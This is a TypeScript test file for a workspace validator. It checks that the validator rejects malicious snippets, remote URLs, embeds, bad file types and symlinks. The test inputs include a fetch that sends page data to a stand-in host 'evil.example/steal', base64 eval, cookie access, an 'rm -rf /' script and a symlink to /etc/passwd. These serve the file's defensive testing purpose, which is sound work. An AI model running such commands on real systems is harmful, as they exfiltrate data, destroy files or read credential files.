import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { validateWorkspace } from "../src/check.mjs";
import { assembleWorkspace } from "../src/workspace.ts";
import { specFor } from "./fixtures.ts";

function workspace() {
  const dir = mkdtempSync(join(tmpdir(), "cc-check-"));
  assembleWorkspace(dir, specFor("static", "minimal_flat", "en"));
  return dir;
}
const rules = (dir: string, format: "static" | "video" = "static") =>
  validateWorkspace(dir, { format }).errors.map((e) => e.rule);

test("malicious code is rejected", () => {
  const cases: [string, string][] = [
    ["fetch('https://evil.example/steal?c=' + document.title)", "network"],
    ["const ws = new WebSocket('wss://x')", "network"],
    ["navigator.sendBeacon('/x', 'y')", "network"],
    ["eval(atob('YWxlcnQoMSk='))", "eval"],
    ["const f = new Function('return 1')", "eval"],
    ["setTimeout('alert(1)', 10)", "eval"],
    ["import('https://cdn.example/x.js')", "remote-import"],
    ["localStorage.setItem('a', 1)", "storage"],
    ["document.cookie", "storage"],
    ["window.parent.postMessage('x', '*')", "escape"],
    ["const r = Math.random()", "randomness"],
    ["const now = Date.now()", "wallclock"],
  ];
  for (const [code, rule] of cases) {
    const dir = workspace();
    writeFileSync(join(dir, "extra.js"), code);
    assert.ok(rules(dir).includes(rule), `${code} → ${rule}`);
  }
});

test("remote URLs, embeds, bad file types, symlinks, and missing hooks are rejected", () => {
  let dir = workspace();
  writeFileSync(
    join(dir, "styles.css"),
    "@import url(https://fonts.googleapis.com/css2?family=Inter);",
  );
  assert.ok(rules(dir).includes("remote-url"));

  dir = workspace();
  writeFileSync(
    join(dir, "index.html"),
    '<iframe src="x.html"></iframe><script>window.__ready = true</script>',
  );
  assert.ok(rules(dir).includes("embed"));

  dir = workspace();
  writeFileSync(join(dir, "payload.sh"), "rm -rf /");
  assert.ok(rules(dir).includes("file-type"));

  dir = workspace();
  symlinkSync("/etc/passwd", join(dir, "passwd.txt"));
  assert.ok(rules(dir).includes("symlink"));

  dir = workspace();
  writeFileSync(join(dir, "main.js"), "console.log('no ready hook')");
  assert.ok(rules(dir).includes("ready-hook"));
  assert.ok(rules(dir, "video").includes("render-hook"));
});

test("SVG namespaces are allowed; vendored code is exempt from code rules", () => {
  const dir = workspace();
  writeFileSync(join(dir, "icon.svg"), '<svg xmlns="http://www.w3.org/2000/svg"></svg>');
  mkdirSync(join(dir, "vendor"), { recursive: true });
  writeFileSync(join(dir, "vendor/lib.js"), "const r = Math.random();");
  assert.deepEqual(rules(dir), []);
});
